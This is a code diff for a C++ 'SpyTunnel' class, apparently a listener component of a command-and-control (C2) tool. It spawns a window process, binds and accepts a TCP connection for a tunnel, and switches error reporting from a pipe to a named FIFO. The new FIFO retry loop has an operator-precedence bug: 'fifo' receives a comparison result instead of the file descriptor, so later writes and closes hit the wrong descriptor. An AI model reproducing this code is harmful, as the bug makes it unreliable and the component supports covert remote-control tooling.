@@ -1,89 +1,86 @@
 #include "spy_tunnel.hpp"
 
-SpyTunnel::SpyTunnel(std::string* __p_ip, uint* __p_port, int __client_index, std::atomic<bool>* __p_shutdown_flag, int __connection_type) {    
-    p_ip_ = __p_ip;
-    p_port_ = __p_port;
-    client_index_ = __client_index;
-    p_shutdown_flag_ = __p_shutdown_flag;
-    socket_ = -1;
-    connection_type_ = __connection_type;
+SpyTunnel::SpyTunnel(std::string* __p_ip, uint* __p_port, int __client_index, std::atomic<bool>* __p_shutdown_flag, int __connection_type, std::shared_ptr<LogContext> __log_context, int __shutdown_event_fd)
+    : p_ip_(__p_ip),
+      p_port_(__p_port),
+      client_index_(__client_index),
+      p_shutdown_flag_(__p_shutdown_flag),
+      connection_type_(__connection_type),
+      log_context_(__log_context),
+      shutdown_event_fd_(__shutdown_event_fd),
+      event_log_(__log_context)
+{
 }
 
-int SpyTunnel::run() {
-    int comm_pipe[2];
-    if (pipe(comm_pipe) == -1) {
-        return -1;
-    }
-    
+int SpyTunnel::run() {    
     pid_t pid = fork();
     if (pid < 0) {
         return -1;
     } else if (pid == 0) {
-        // Child process
-        close(comm_pipe[1]); // Child-end of the pipe is read-only
-        dup2(comm_pipe[0], STDIN_FILENO);
-        close(comm_pipe[0]);
+        // Child Process
 
         spawn_window();
-        std::cerr << RED << "[Server::handle_c2] Error executing C2 script: " << strerror(errno) << RESET;
+        event_log_ << RED << "[Server::handle_c2] Error executing C2 script: " << strerror(errno) << RESET;
         _exit(EXIT_FAILURE);
     }
 
+    // Parent Process
+    int fifo;
+    int tries = 0;
+    while (fifo = open(get_fifo_path(), O_WRONLY | O_NONBLOCK) < 0 && tries++<20) {
+        std::this_thread::sleep_for(std::chrono::milliseconds(300));
+    }
+    if (fifo < 0) {
+        goto cleanup;
+    }
 
-    close(comm_pipe[0]);
-    std::string success_msg = "SpyTunnel started successfully";
     int rc;
     socket_ = socket(AF_INET, connection_type_, 0);
     if (socket_ == -1) {
-        const char* error_msg = "Socket creation failed";
-        write(comm_pipe[1], error_msg, strlen(error_msg));
         goto cleanup;    
     }
     memset(&server_addr_, 0, sizeof(server_addr_));
     server_addr_.sin_family = AF_INET;
     server_addr_.sin_port = htons(*p_port_);
     if (inet_pton(AF_INET, p_ip_->c_str(), &server_addr_.sin_addr) <= 0) {
-        const char* error_msg = "Invalid address or address not supported";
-        write(comm_pipe[1], error_msg, strlen(error_msg));
+        write_error(fifo, "Invalid IP address");
         goto cleanup;
     }
 
     rc = bind(socket_, (const struct sockaddr*) &server_addr_, sizeof(server_addr_));
     if (rc < 0) {
-        const char* error_msg = "Error binding socket";
-        write(comm_pipe[1], error_msg, strlen(error_msg));
+        write_error(fifo, strerror(errno));
         goto cleanup;
     }
     rc = listen(socket_, 1);
     if (rc < 0) {
-        const char* error_msg = "Error listening on socket";
-        write(comm_pipe[1], error_msg, strlen(error_msg));
+        write_error(fifo, strerror(errno));
         goto cleanup;
     }
     rc = accept(socket_, nullptr, nullptr);
     if (rc < 0) {
-        const char* error_msg = "Error accepting connection";
-        write(comm_pipe[1], error_msg, strlen(error_msg));
+        write_error(fifo, strerror(errno));
         goto cleanup;
     }
-    write(comm_pipe[1], success_msg.c_str(), success_msg.length());
-    close(comm_pipe[1]);
-    handle_tunnel(rc, comm_pipe[1]);
+
+    handle_tunnel(rc, fifo);
     close(rc);
-    
+
 cleanup:
+    if (fifo >= 0) {
+        close(fifo);
+    }
     if (socket_ != -1) {
         close(socket_);
-    }
-    if (comm_pipe[0] != -1) {
-        close(comm_pipe[0]);
-    }
-    if (comm_pipe[1] != -1) {
-        close(comm_pipe[1]);
     }
     if (pid > 0) {
         kill(pid, SIGTERM);
         waitpid(pid, nullptr, 0);
     }
     return 0;
+}
+
+void SpyTunnel::write_error(int fifo, const std::string& __msg) {
+    std::string full_error_msg = "[__error__]: " + __msg + "\n";
+    write(fifo, full_error_msg.c_str(), full_error_msg.size());
 }
